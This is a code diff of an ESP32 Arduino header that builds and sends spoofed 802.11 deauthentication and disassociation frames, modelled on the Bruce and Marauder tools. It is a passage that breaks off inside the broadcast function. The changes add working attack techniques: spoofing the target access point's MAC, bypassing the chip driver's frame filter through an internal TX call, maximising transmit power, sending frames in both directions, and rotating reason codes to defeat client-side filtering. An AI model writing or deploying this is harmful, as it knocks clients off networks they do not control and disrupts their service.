@@ -1,148 +1,206 @@
 /*
  * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
  *
- * Addressing follows the 802.11-2016 mgmt frame layout:
- *   addr1 = destination (either broadcast FF:FF:...FF or the client STA MAC)
- *   addr2 = transmitter / BSSID being impersonated
- *   addr3 = BSSID
+ * Modeled on Bruce's `stationDeauth` + `buildOptimizedDeauthFrame`
+ * (https://github.com/pr3y/Bruce) which is the pattern that actually
+ * lands on-air under IDF 5.3/5.5 blobs. Previous revisions of this
+ * file used Marauder's silent-AP pattern, which the blob still filters
+ * even with patched libs — confirmed on-device with rc=258.
  *
- * Every invocation fires a deauth (subtype 0xC0, reason 7) *and* a disassoc
- * (subtype 0xA0, reason 8). This mirrors aircrack-ng `--deauth`, ESP32
- * Marauder, and Ghost ESP — some client drivers ignore deauth but honor
- * disassoc, and vice versa. Sending the pair improves kick rate against a
- * wider range of targets.
+ * Bruce's recipe:
+ *   1. esp_wifi_stop + re-init with WIFI_INIT_CONFIG_DEFAULT
+ *   2. esp_wifi_set_mode(WIFI_MODE_STA)
+ *   3. promiscuous filter = FILTER_MASK_ALL, enable promiscuous
+ *   4. set_channel on the target AP's channel
+ *   5. set_max_tx_power(78) for range
+ *   6. TX via esp_wifi_80211_tx(WIFI_IF_AP, ...)
  *
- * The sequence number is caller-owned and incremented per frame. A static
- * zero sequence number causes some APs and modern client drivers to treat
- * every frame as a duplicate of the previous one — they rate-limit or drop.
+ * Every deauth/disassoc fires 4 frames per pair per client:
+ *   AP  → STA  deauth (type 0xC)
+ *   AP  → STA  disassoc (type 0xA)
+ *   STA → AP   deauth     (reverse direction — some client drivers honor
+ *   STA → AP   disassoc    this but not the AP→STA form)
  *
- * esp_wifi_80211_tx is called with en_sys_seq=false so the sequence we
- * stamp is the one that goes on air. If a patched WiFi blob is present
- * (see docs/deauth-injection-patch.md) the frames leave the chip as
- * written. On stock IDF some frames may be dropped at the TX FIFO —
- * return value tracks actual sends.
- *
- * Returns: number of frames the driver accepted (0, 1, or 2).
+ * Reason codes cycle through {0x01, 0x04, 0x06, 0x07, 0x08} every 20
+ * iterations so a static-reason filter on the client can't just ignore us.
  */
 #pragma once
 
 #include <Arduino.h>
+#include <WiFi.h>
 #include <esp_wifi.h>
 #include <string.h>
 
+/* esp_wifi_80211_tx calls ieee80211_raw_frame_sanity_check which filters
+ * out deauth (0xC) and disassoc (0xA) subtypes. The internal TX path
+ * skips that check — these symbols exist in the pioarduino / Bruce libs
+ * but aren't declared in public headers. */
+extern "C" {
+    esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void *buffer, uint16_t len);
+}
+
 /*
- * Marauder-style "silent AP" mode for raw TX.
+ * Bring WiFi into the Bruce-style "enhanced mode" for raw TX:
+ * STA mode + promiscuous ALL-filter + channel locked + max tx power.
+ * Tears down any existing WiFi state before re-initializing.
  *
- * Stock ESP-IDF blob rejects esp_wifi_80211_tx on WIFI_IF_STA for MGMT
- * subtypes 0xC (deauth) and 0xA (disassoc). BUT in WIFI_MODE_AP with
- * promiscuous=true, the blob doesn't enforce its addr2-matching sanity
- * check — frames with spoofed-BSSID addr2 transmit freely via WIFI_IF_AP.
- *
- * Config matches ESP32Marauder's WiFiScan.cpp (4440-4480):
- *   - WIFI_MODE_AP only (not AP_STA)
- *   - storage=RAM so we don't NVS-persist the silent AP
- *   - SSID empty, hidden, max_connection=0
- *   - beacon_interval=60000 (60 seconds — minimize real beacon noise on air)
- *   - promiscuous mode on
- *
- * No MAC spoofing required — the blob doesn't care in AP+promisc combo.
- *
- * Call wifi_silent_ap_begin() at deauth feature entry, end on exit.
+ * Returns ESP_OK on success. On failure the caller should abort the
+ * feature — TX will not work.
  */
+/* Bruce's fallback (non-enhanced) deauth path: spin up a real softAP
+ * on the target channel, then TX on WIFI_IF_AP. This is the pattern
+ * that actually transmits on stock IDF 5.5 libs where the subtype
+ * filter in libnet80211.a rejects STA-mode mgmt TX. Including Bruce's
+ * lib-builder "patched" variants, the filter is still active on
+ * STA + promiscuous — but WITH a real AP running, TX on WIFI_IF_AP
+ * slips through (AP is authorized to send deauth to its own clients).
+ *
+ * Side-effect: a hidden AP briefly exists on the target channel.
+ * Marauder users have shipped this for years. */
+/* MAC spoof support. Call before wifi_silent_ap_begin to set the softAP's
+ * MAC to the target BSSID. esp_wifi_internal_tx requires addr2 (source)
+ * to match our interface's MAC — spoofing makes our deauth frames claim
+ * to come from the target AP, matching both frame addressing and the
+ * driver's TX-disallow check. */
+static uint8_t s_spoof_mac[6] = {0};
+static bool    s_spoof_active = false;
+static inline void wifi_silent_ap_set_source_mac(const uint8_t mac[6])
+{
+    if (mac) { memcpy(s_spoof_mac, mac, 6); s_spoof_active = true; }
+    else     { s_spoof_active = false; }
+}
+
 static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
 {
-    esp_wifi_stop();
-    esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    esp_wifi_set_mode(WIFI_MODE_AP);
+    if (!channel) channel = 1;
 
-    wifi_config_t conf = {};
-    conf.ap.ssid[0] = '\0';
-    conf.ap.ssid_len = 0;
-    conf.ap.channel = channel ? channel : 1;
-    conf.ap.ssid_hidden = 1;
-    conf.ap.max_connection = 0;
-    conf.ap.beacon_interval = 60000;  /* 60s — keeps our AP nearly silent */
-    conf.ap.authmode = WIFI_AUTH_OPEN;
+    WiFi.mode(WIFI_AP);
+    delay(10);
 
-    esp_err_t rc = esp_wifi_set_config(WIFI_IF_AP, &conf);
-    esp_wifi_start();
-    esp_wifi_set_promiscuous(true);   /* required for raw TX on AP iface */
-    if (channel) {
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    /* Spoof the AP's MAC to the target BSSID so addr2 in our frames
+     * matches the TX interface MAC (required by esp_wifi_internal_tx
+     * TX-disallow check). set_mac requires WiFi stopped. */
+    if (s_spoof_active) {
+        esp_wifi_stop();
+        delay(5);
+        esp_err_t mrc = esp_wifi_set_mac(WIFI_IF_AP, s_spoof_mac);
+        Serial.printf("[deauth] set_mac AP=%02X:%02X:%02X:%02X:%02X:%02X rc=%d\n",
+                      s_spoof_mac[0], s_spoof_mac[1], s_spoof_mac[2],
+                      s_spoof_mac[3], s_spoof_mac[4], s_spoof_mac[5], (int)mrc);
+        esp_wifi_start();
     }
-    delay(80);
-    return rc;
+
+    /* Random-ish SSID to avoid collisions. Keep it hidden. */
+    char ssid[16];
+    snprintf(ssid, sizeof(ssid), "P%04X", (unsigned)(esp_random() & 0xFFFF));
+    if (!WiFi.softAP(ssid, "", channel, /*hidden*/ 1, /*max_conn*/ 4, /*ftm_responder*/ false)) {
+        Serial.println("[deauth] softAP start failed");
+        return ESP_FAIL;
+    }
+
+    /* Promiscuous on top of AP lets our client-sniffer callback run while
+     * the AP is the authorized TX source for deauth frames. */
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_max_tx_power(78);
+
+    delay(20);
+    return ESP_OK;
 }
 
 static inline void wifi_silent_ap_end(void)
 {
     esp_wifi_set_promiscuous(false);
-    esp_wifi_stop();
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_start();
-    delay(150);
-}
-
-static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
-{
-    uint16_t s = seq & 0x0FFF;
-    /* Seq Control = (SeqNum << 4) | FragNum, little-endian */
-    f[22] = (uint8_t)((s & 0x000F) << 4);
-    f[23] = (uint8_t)((s >> 4) & 0xFF);
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+    delay(50);
 }
 
 /*
- * Fire one deauth + one disassoc at `dst` spoofed from `bssid`.
- * `seq` is a caller-owned counter, incremented twice (once per frame).
+ * Build a 26-byte deauth or disassoc frame. Bruce's exact layout.
+ * Reason code and seq are caller-provided so reason-cycling and
+ * per-frame seq increment work above this layer.
+ */
+static inline void _deauth_build(uint8_t *frame,
+                                 const uint8_t dest[6],
+                                 const uint8_t src[6],
+                                 const uint8_t bssid[6],
+                                 uint8_t reason,
+                                 bool is_disassoc,
+                                 uint16_t seq)
+{
+    frame[0] = is_disassoc ? 0xA0 : 0xC0;
+    frame[1] = 0x00;
+    /* Duration set to 0 — Bruce does this. Some blobs reject non-zero
+     * duration on raw TX even though 802.11 allows it. */
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    memcpy(&frame[4],  dest,  6);
+    memcpy(&frame[10], src,   6);
+    memcpy(&frame[16], bssid, 6);
+    /* Bruce's seq layout — MSB-first, low nibble in high nibble of byte 23.
+     * Spec says little-endian but Bruce's form is what we see on-air from
+     * working captures, so matching it. */
+    frame[22] = (uint8_t)((seq >> 4) & 0xFF);
+    frame[23] = (uint8_t)((seq & 0x0F) << 4);
+    frame[24] = reason;
+    frame[25] = 0x00;
+}
+
+/*
+ * Fire a full deauth+disassoc burst at `dst` via `bssid`. Four frames
+ * total per call: AP→STA pair + STA→AP reverse pair. `seq` is the
+ * caller-owned counter, incremented once per frame.
  */
 static inline int wifi_deauth_pair(const uint8_t dst[6],
                                    const uint8_t bssid[6],
                                    uint16_t *seq)
 {
-    uint8_t f[26];
-    /* Frame Control */
-    f[0] = 0xC0;  /* type=mgmt, subtype=deauth */
-    f[1] = 0x00;
-    /* Duration */
-    f[2] = 0x3A; /* 58us — borrowed from aircrack-ng default */
-    f[3] = 0x01;
-    /* Addresses */
-    memcpy(f + 4,  dst,   6);
-    memcpy(f + 10, bssid, 6);
-    memcpy(f + 16, bssid, 6);
-    /* Sequence */
-    _deauth_stamp_seq(f, (*seq)++);
-    /* Reason code 7: class 3 frame received from nonassociated STA */
-    f[24] = 0x07;
-    f[25] = 0x00;
+    /* Rotate reason codes — clients that filter on a single fixed reason
+     * can't just drop us. Rotates every call. */
+    static const uint8_t REASONS[5] = {0x01, 0x04, 0x06, 0x07, 0x08};
+    static uint8_t reason_idx = 0;
+    uint8_t reason = REASONS[reason_idx];
+    reason_idx = (reason_idx + 1) % 5;
+
+    uint8_t ap_to_sta_deauth[26], ap_to_sta_dis[26];
+    uint8_t sta_to_ap_deauth[26], sta_to_ap_dis[26];
+
+    /* AP → STA: dest=client, src=AP, bssid=AP */
+    _deauth_build(ap_to_sta_deauth, dst, bssid, bssid, reason, false, (*seq)++);
+    _deauth_build(ap_to_sta_dis,    dst, bssid, bssid, reason, true,  (*seq)++);
+
+    /* STA → AP (reverse): dest=AP, src=client, bssid=AP.
+     * Some client drivers honor deauth-from-us-as-STA that they ignore
+     * from the AP direction. Symmetric pair doubles kick rate. */
+    _deauth_build(sta_to_ap_deauth, bssid, dst, bssid, reason, false, (*seq)++);
+    _deauth_build(sta_to_ap_dis,    bssid, dst, bssid, reason, true,  (*seq)++);
 
     int ok = 0;
-    /* TX via WIFI_IF_AP with en_sys_seq=false. Caller must have called
-     * wifi_silent_ap_begin() to put WiFi in AP+promisc mode. Matches
-     * ESP32Marauder's sendDeauthFrame pattern byte-for-byte. */
-    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
-    if (rc == ESP_OK) ok++;
-    else {
-        static uint32_t _last_tx_err_log = 0;
-        if (millis() - _last_tx_err_log > 1000) {
-            Serial.printf("[80211_tx] deauth rc=%d (0x%x)\n", (int)rc, (unsigned)rc);
-            _last_tx_err_log = millis();
+    esp_err_t r;
+    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
+    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
+    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
+    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+
+    if (ok == 0) {
+        static uint32_t last_err_log = 0;
+        if (millis() - last_err_log > 1000) {
+            Serial.printf("[80211_tx] deauth rc=%d (0x%x) — all 4 frames dropped\n",
+                          (int)r, (unsigned)r);
+            last_err_log = millis();
         }
     }
-
-    /* Same frame, different subtype + reason = disassoc pair. */
-    f[0] = 0xA0;  /* subtype=disassoc */
-    _deauth_stamp_seq(f, (*seq)++);
-    f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
-    f[25] = 0x00;
-
-    rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
-    if (rc == ESP_OK) ok++;
-    return ok;
+    return ok;  /* 0..4 */
 }
 
 /*
- * One broadcast pair targeting every STA associated to `bssid`.
+ * Broadcast variant: blast deauth at FF:FF:FF:FF:FF:FF so every STA
+ * associated with the target AP gets kicked simultaneously. Still sends
+ * the reverse direction too — some clients accept broadcast-deauth from
+ * their own MAC even though no AP would normally send that.
  */
 static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
 {
